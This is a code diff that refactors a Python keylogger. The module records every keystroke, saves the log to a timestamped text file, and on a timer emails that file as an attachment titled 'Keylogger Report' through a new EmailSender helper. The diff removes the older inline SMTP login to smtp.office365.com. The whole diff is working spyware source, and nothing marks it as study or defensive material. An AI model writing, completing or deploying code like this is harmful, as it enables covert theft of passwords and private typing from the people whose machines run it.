@@ -1,11 +1,9 @@
+# src/models/keylogger_model.py
 import keyboard
-import smtplib
 import logging
 from threading import Timer
 from datetime import datetime
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from config.keylogger_config import Config
+from models.email_sender import EmailSender
 
 class KeyloggerModel:
     """Handles keylogging functionality."""
@@ -15,6 +13,7 @@ class KeyloggerModel:
         self.log = ""
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
+        self.email_sender = EmailSender()
 
     def on_keydown(self, event):
         name = event.name
@@ -43,35 +42,21 @@ class KeyloggerModel:
         with open(f"{filename}.txt", "w") as f:
             f.write(self.log)
         logging.info(f"[+] Saved {filename}.txt")
-
-    def prepare_mail(self, message):
-        """Prepare the email content."""
-        msg = MIMEMultipart("alternative")
-        msg["From"] = Config().email_address
-        msg["To"] = Config().email_address
-        msg["Subject"] = "Keylogger Report"
-        msg.attach(MIMEText(message, "plain"))
-        return msg.as_string()
-
-    def save_report_to_mail(self):
-        """Send the report via email."""
-        server = smtplib.SMTP(host="smtp.office365.com", port=587)
-        server.starttls()
-        try:
-            server.login(Config().email_address, Config().email_password)
-            server.sendmail(Config().email_address, Config().email_address, self.prepare_mail(self.log))
-            logging.info(f"Sent an email with log.")
-        finally:
-            server.quit()
-
+        return f"{filename}.txt" 
+        
     def report_logs(self):
         """Log the keys pressed periodically."""
         if self.log:
             self.end_dt = datetime.now()
-            if self.method == "email":
-                self.save_report_to_mail()
-            elif self.method == "file":
-                self.save_report_to_file()
+            logging.info("Preparing to send email...")
+
+            if self.method == "file":
+                attachment = self.save_report_to_file()
+                self.email_sender.send_email(self.email_sender.email_address, 
+                                            "Keylogger Report", 
+                                            "Attached is the keylogger report.", 
+                                            attachment)
+
             logging.info(f"[{self.define_filename()}] - saved")
             self.start_dt = datetime.now()
         self.log = ""
